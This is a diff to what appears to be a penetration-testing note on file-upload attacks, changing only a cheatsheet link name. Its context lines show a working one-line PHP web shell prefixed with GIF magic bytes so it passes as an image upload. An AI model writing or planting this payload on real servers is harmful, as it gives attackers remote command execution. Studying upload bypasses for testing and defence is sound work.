@@ -2,7 +2,7 @@ For attackers, the ability to store files on the back-end server may extend the 
 ## Image Upload
 Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image.
 
-Upload Malicious file (see [[Magic Numbers Cheatsheet]])
+Upload Malicious file (see [[Magic Bytes Cheatsheet]])
 ```bash
 # simple php webshell with Magic bytes
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
